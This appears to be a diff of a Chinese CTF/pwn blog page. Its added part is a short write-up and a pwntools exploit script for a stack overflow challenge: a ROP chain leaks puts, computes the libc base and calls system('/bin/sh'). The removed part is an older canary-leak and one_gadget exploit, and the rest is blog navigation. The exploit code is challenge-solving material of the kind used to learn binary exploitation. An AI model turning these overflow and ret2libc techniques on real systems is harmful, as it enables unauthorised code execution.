+<p>ret的操作是pop rip，rsp=rsp+8, 指向0x0x7fff153a5588.  endbr64指令rsp是不动的，push rbp后rbp变成了原来返回地址的位置,再次调用相同的输入也只是让rbp+8,即每次</p>
+<pre><code class="lang-py">for i in range(20):
+    payload=b&#39;c&#39;*0x28+p64(vul)
+    p.send(payload)
+    print(i)
+</code></pre>
+<p>也只是让rbp+8移动</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922202708003.png" alt="image-20240922202708003"></p>
+<p>第二次的rbp</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922203434985.png" alt="image-20240922203434985"></p>
+<p>只是调用vuln的话时不会回显的。</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922210006385.png" alt="image-20240922210006385"></p>
+<p>其实不是理想当然的填充，得调用extend函数填充缓冲区。那么就只能不断调用extend函数把缓冲区填满。</p>
+<p>调用extend时第二十次时的栈</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922205219910.png" alt="image-20240922205219910"></p>
+<p>exp</p>
 <pre><code class="lang-py">from pwn import*
 from LibcSearcher import *
-#p=remote(&quot;59.62.61.30&quot;,46489)
+#p=remote(&quot;node4.buuoj.cn&quot;,)
 p=process(&quot;./pwn&quot;)
 context.log_level=&quot;debug&quot;
-libc=ELF(&#39;./libc-2.27.so&#39;)
+elf=ELF(&#39;./pwn&#39;)
+libc=ELF(&#39;./libc-2.31.so&#39;)
+extend=0x401287
+vul=0x40125D
+pop_rdi=0x4013d3
+puts_got=elf.got[&#39;puts&#39;]
+puts=elf.plt[&#39;puts&#39;]
+payload=b&#39;a&#39;*0x58+p64(vul)
 
-pop_rdi=0x400853
-puts_got=0x601018
-call_puts=0x4007af
-payload=b&#39;a&#39;*0x48+b&#39;b&#39;
-puts_plt=0x400580
 
-#pause()
 p.send(payload)
-p.recvuntil(&#39;b&#39;)
+payload=b&#39;b&#39;*0x28+p64(pop_rdi)+p64(puts_got)+p64(puts)+p64(extend)+p64(vul)
+p.send(payload)
+for i in range(21):
+    payload=b&#39;c&#39;*0x28+p64(extend)+p64(vul)
+    p.send(payload)
 
-canary=u64(p.recv(7).rjust(8,b&#39;\x00&#39;))
-rbp_addr=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
-print(hex(canary))
-print(&#39;rbp&#39;+hex(rbp_addr))
-
-payload=b&#39;b&#39;*0x48+p64(canary)+p64(rbp_addr-0x50)
-payload+=p64(pop_rdi)+p64(puts_got)+p64(call_puts)
-
-gdb.attach(p)
-sleep(1)
-pause()
-
-p.sendlineafter(&#39;overflow!&#39;,payload)
+p.recvuntil(&#39;stdout???&#39;)
 p.recvline()
-
-puts=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
-base=puts-libc.sym[&#39;puts&#39;]
+puts_addr=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
+base=puts_addr-0x10dfc0 #libc.sym[&#39;puts&#39;]
 system=base+libc.sym[&#39;system&#39;]
 binsh=base+next(libc.search(b&#39;bin/sh&#39;))
-print(&#39;puts&#39;+hex(puts))
-one=[0x4f3d5,0x4f432,0x10a41c]
-one_gadget=base+one[0]
-#
-p.recvline()
-payload=b&#39;a&#39;*0x48+p64(canary)+b&#39;a&#39;*8+p64(one_gadget)
-#+p64(pop_rdi)+p64(binsh)+p64(system)
-p.sendline(payload)
+gdb.attach(p)
+pause()
+payload=b&#39;b&#39;*0x28+p64(pop_rdi)+p64(binsh)+p64(system)
+p.send(payload)
+print(hex(libc.sym[&#39;puts&#39;]))
+print(&#39;put&#39;+hex(puts_addr))
+
 
 p.interactive()
 </code></pre>
@@ -458,7 +469,7 @@ p.interactive()
 
 
         <span>
-          <a class="article-read" href="/2024/07/27/武功论剑/"> Read more -->
+          <a class="article-read" href="/2024/09/21/stdout/"> Read more -->
           </span>
         </div>
 
@@ -468,7 +479,7 @@ p.interactive()
 
 
       <div id="recent-posts-paginator">
-        <a class="extend prev" rel="prev" href="/"> </a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/3/"> </a>
+        <a class="extend prev" rel="prev" href="/"> </a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/3/"> </a>
       </div>
 
     </div>
@@ -524,23 +535,23 @@ p.interactive()
       <ul>
         
           <li>
-            <a class="recent_posts-list-link" href="/2024/11/03/house-of-force/">200~house_of_force</a>
+            <a class="recent_posts-list-link" href="/2024/11/26/FUZZ/xpdf/">xpdf</a>
           </li>
         
           <li>
-            <a class="recent_posts-list-link" href="/2024/10/29/pwn2%20short/">(no title)</a>
+            <a class="recent_posts-list-link" href="/2024/11/20/trick/">trick</a>
           </li>
         
           <li>
-            <a class="recent_posts-list-link" href="/2024/10/21/overlapping_chunks/">overlapping_chunks</a>
+            <a class="recent_posts-list-link" href="/2024/11/20/trick/trick/">trick</a>
           </li>
         
           <li>
-            <a class="recent_posts-list-link" href="/2024/10/17/heapcreator/">heapcreator</a>
+            <a class="recent_posts-list-link" href="/2024/11/18/qwnt2024/">qwnt2024</a>
           </li>
         
           <li>
-            <a class="recent_posts-list-link" href="/2024/09/21/stdout/">stdout</a>
+            <a class="recent_posts-list-link" href="/2024/11/13/%E6%B2%99%E7%AE%B1/%E6%B2%99%E7%AE%B1/">沙箱</a>
           </li>
         
       </ul>
@@ -552,7 +563,7 @@ p.interactive()
 </aside>
 
 <!-- <div id="paginator"> -->
-<!--   <a class="extend prev" rel="prev" href="/"> </a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/3/"> </a> -->
+<!--   <a class="extend prev" rel="prev" href="/"> </a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/3/"> </a> -->
 <!-- </div> -->
 
     <script type="text/x-mathjax-config">
